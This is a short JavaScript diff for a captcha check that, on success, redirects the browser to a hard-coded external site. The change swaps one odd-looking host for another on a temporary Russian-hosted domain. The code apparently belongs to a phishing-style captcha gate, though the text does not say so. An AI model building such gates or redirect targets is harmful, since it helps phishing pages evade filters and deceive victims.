@@ -30,7 +30,7 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="https://orge-inkling.tftpd.net/wp/oro/";
+        targetURL="http://jemarih323.temp.swtest.ru/wpfiles/";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
